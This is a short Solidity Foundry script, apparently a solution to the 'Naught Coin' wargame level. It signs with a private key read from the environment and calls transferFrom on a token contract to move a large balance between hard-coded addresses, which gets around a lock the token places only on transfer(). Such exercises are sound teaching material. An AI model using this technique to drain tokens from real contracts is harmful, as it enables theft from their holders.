// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script} from "forge-std/Script.sol";
import {console2} from "forge-std/console2.sol";

interface IERC{
    function transferFrom(address, address, uint256) external returns (bool);
}

contract NaughtCoin is Script {
    function run() external{
        uint256 deployerPrivateKey = vm.envUint("pvt_key_1");
        vm.startBroadcast(deployerPrivateKey);
        
        IERC(0x1ca337b3A1C3D4C8e716c0F8Ca26d66060DAd5f9).transferFrom(0xFA9e6f9049fF9874fa6C1Ea72C9E96285f2AEE3a, 0x657167F589aA788A52979d4F40f74B6d82aAA6c5, 1000000000000000000000000);

        vm.stopBroadcast();
        
    }
}
